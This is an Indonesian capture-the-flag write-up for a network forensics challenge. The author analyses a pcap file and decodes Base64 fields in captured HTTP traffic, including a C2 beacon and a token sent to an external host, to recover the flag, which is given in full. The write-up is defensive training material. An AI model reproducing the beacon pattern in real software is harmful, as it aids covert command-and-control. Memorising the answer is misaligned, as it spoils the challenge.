---
title: "W1-E2 Lalu Lintas Jaringan"
author: azizul-manal-gaumalanga
tags: [forensics, zero-day-2026]
image: images/oxucl-logo.jpg
---

## Detail Soal

| Field | Value |
|-------|-------|
| Nama Challenge | W1-E2: Lalu Lintas Jaringan |
| Kategori | Digital Forensics |
| Event | ZERO DAY Mini Games 2026 |
| File | `traffic.pcap` |

## Deskripsi Singkat

Pada challenge **W1-E2: Lalu Lintas Jaringan**, diberikan sebuah file capture bernama `traffic.pcap`. File ini berisi rekaman lalu lintas jaringan dari workstation yang dicurigai melakukan komunikasi tidak sah dengan server eksternal. Tujuan dari challenge ini adalah menganalisis traffic tersebut dan menemukan data tersembunyi yang mengarah ke flag.

## Analisis Awal

Langkah pertama yang saya lakukan adalah membuka file `traffic.pcap` menggunakan Wireshark. Dari hasil pengamatan awal, terlihat bahwa traffic berisi beberapa komunikasi HTTP biasa, seperti akses ke website umum, request status API, request ping internal, dan komunikasi ke beberapa endpoint.

Untuk mempercepat analisis, saya juga menggunakan perintah `strings` agar dapat melihat teks yang terbaca langsung dari file PCAP.

```bash
strings traffic.pcap
```

Dari hasil tersebut terlihat beberapa request HTTP, salah satunya menuju host berikut:

```text
backend.siluman-tech.id
```

Host ini terlihat mencurigakan karena terdapat beberapa endpoint yang tidak umum, seperti:

```text
/api/submit
/session/refresh
/api/c2/beacon
/update/check
```

Selain itu, ditemukan juga beberapa data yang terlihat seperti Base64.

## Langkah Penyelesaian

Pada awalnya ditemukan request berikut:

```text
POST /api/submit HTTP/1.1
Host: backend.siluman-tech.id

user_id=EMP3391&action=check_in&secret_token=c2VjcmV0XzRiOGYyYzlkMWE2ZTNmN2IwYzVkMmU4YTlmNGIxYzdl
```

Nilai `secret_token` tersebut terlihat seperti Base64, sehingga saya mencoba melakukan decode.

```bash
echo 'c2VjcmV0XzRiOGYyYzlkMWE2ZTNmN2IwYzVkMmU4YTlmNGIxYzdl' | base64 -d
```

Hasilnya:

```text
secret_4b8f2c9d1a6e3f7b0c5d2e8a9f4b1c7e
```

Namun hasil tersebut bukan flag, melainkan hanya token atau petunjuk lain. Karena challenge menyebutkan adanya data yang disembunyikan dalam lalu lintas normal, saya melanjutkan analisis ke request lain yang terlihat lebih mencurigakan.

Kemudian ditemukan komunikasi berikut:

```text
POST /api/c2/beacon HTTP/1.1
Host: backend.siluman-tech.id
Content-Type: application/json
X-Client-ID: SLM-EMP3391

{"host":"WS-3391","os":"win10","ts":1748000000}
```

Endpoint `/api/c2/beacon` cukup mencurigakan karena istilah **C2** biasanya merujuk pada **Command and Control**, yaitu komunikasi antara client yang terinfeksi dengan server pengendali.

Response dari server berisi data berikut:

```text
HTTP/1.1 200 OK
Content-Type: application/json
X-Request-ID: c2-20260528-9f3a

{"status":"ok","task":"idle","ref":"ZmxhZ3twY2FwX2MyX3IzZl9iNHMzNjRfM3hmMWx9"}
```

Pada bagian response terdapat field `ref` yang berisi string Base64:

```text
ZmxhZ3twY2FwX2MyX3IzZl9iNHMzNjRfM3hmMWx9
```

String tersebut kemudian saya decode menggunakan perintah:

```bash
echo 'ZmxhZ3twY2FwX2MyX3IzZl9iNHMzNjRfM3hmMWx9' | base64 -d
```

Hasil decode-nya adalah:

```text
flag{pcap_c2_r3f_b4s364_3xf1l}
```

Dari sini dapat disimpulkan bahwa flag disembunyikan pada response komunikasi C2 dalam field `ref`, lalu diencoding menggunakan Base64.

## Flag

```text
flag{pcap_c2_r3f_b4s364_3xf1l}
```

## Kesimpulan / Hal yang Dipelajari

Pada challenge ini, flag tidak muncul secara langsung di tampilan traffic biasa. Data penting disamarkan dalam komunikasi HTTP yang terlihat normal, tepatnya pada response endpoint `/api/c2/beacon`. Dari challenge ini dipelajari bahwa dalam analisis PCAP, kita tidak hanya perlu melihat request yang terlihat mencurigakan, tetapi juga perlu memeriksa response server, parameter tersembunyi, header, serta data yang tampak seperti hasil encoding. Base64 sering digunakan untuk menyamarkan data agar tidak langsung terbaca.
